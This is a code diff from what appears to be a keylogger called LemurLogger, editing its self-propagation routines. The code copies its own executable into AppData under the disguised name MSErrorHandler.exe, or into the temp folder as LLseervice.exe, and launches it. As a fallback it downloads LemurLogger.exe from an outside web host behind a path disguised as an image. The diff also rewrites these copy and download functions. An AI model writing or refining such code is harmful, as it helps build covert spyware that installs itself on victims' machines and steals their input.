@@ -125,50 +125,23 @@ namespace IO
         system(command.c_str());
     }
 
-    bool copy_w_cmd(std::string path,std::string filename){
-        std::string cur_path_filename = getFileNameWithPath();
-        std::string command = "copy "+cur_path_filename+" "+path+filename;
-        try {
-            system(command.c_str());
-        } catch (std::exception const& e) {
-            return false;
-        }
-        return true;
 
-    }
 
     bool ms_Copyfile(const char * desfile_path){
-        const char * cur_path_filename = getFileNameWithPath().c_str();
-        if (CopyFile (cur_path_filename, desfile_path, true))
+        std::string cur_path_file = getFileNameWithPath();
+        const char * cur_path_filename = cur_path_file.c_str();
+        if (CopyFile (cur_path_filename,desfile_path,1)==0) {
+            //error
             return false;
-
-        else
-           return true;
-
+        }
+        else {
+            return true;
+        }
     }
 
     bool download_File(const char * urlfile,const char * despath)
     {
 
-
-        //GetCurrentDirectory(MAX_PATH, path);
-        //wsprintf(path, TEXT("%s\\LemurLogger.exe"), path);
-        //printf("Path: %S\n", path);
-        HRESULT res = URLDownloadToFile(NULL, urlfile, despath, 0, NULL);
-        if(res == S_OK) {
-            return true;
-        } else
-        if(res == E_OUTOFMEMORY) {
-            return false;
-
-        } /*else if(res == INET_E_DOWNLOAD_FAILURE) {
-            return false;
-
-        } */else {
-            return false;
-        }
-
-        return false;
     }
     inline bool exists_file (const std::string& name) {
         struct stat buffer;
@@ -201,38 +174,46 @@ namespace IO
         CloseHandle(pi.hThread);
     }
     bool copy_File() {
-        std::string appdata_dir(getenv("*APPDATA*"));
+        char* appdata = getenv("APPDATA");
+        std::string appdata_dir(appdata);
         std::string path = appdata_dir + "\\Microsoft\\Services\\";
         std::string filename = "MSErrorHandler.exe";
         std::string fullpath = path + filename;
         if (IO::exists_file(fullpath)) {
-            std::string path = " C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
-            std::string filename = "LLseervice.exe";
-            std::string fullpath = path + filename;
+            char* temp = getenv("temp");
+            std::string temp_dir(temp);
+            path = temp_dir + "\\";
+            filename = "LLseervice.exe";
+            fullpath = path + filename;
         }
         if (IO::exists_file(fullpath)){
             return false;
         }
-        if (!(IO::copy_w_cmd(path, filename))) {
-            //do copy 2
-            const char *desfile_path = fullpath.c_str();
-            if (!(IO::ms_Copyfile(desfile_path))) {
-                //do copy 3
-                if (!(IO::copy(path, filename))) {
-                    //do copy 4
-                    std::string url = "www.arekor.co/content/images/LemurLogger.exe";
-                    if (!(IO::download_File(url.c_str(), path.c_str()))) {
 
-                        return false;
-                    }
+        const char *desfile_path = fullpath.c_str();
+        CreateDirectory(path.c_str(),NULL);
+        if (!(IO::ms_Copyfile(desfile_path))) {
+            //do copy 3
+            if (!(IO::copy(fullpath))) {
+                //do copy 4
+                std::string url = "www.arekor.co/content/images/LemurLogger.exe";
+                if (!(IO::download_File(url.c_str(), path.c_str()))) {
+
+                    return false;
+                }else {
+                    startup(fullpath.c_str());
+                    return true;
                 }
+            }else {
+                startup(fullpath.c_str());
+                return true;
             }
-        } else {
+        }else {
             startup(fullpath.c_str());
             return true;
         }
-    }
 
+    }
 
 }
 
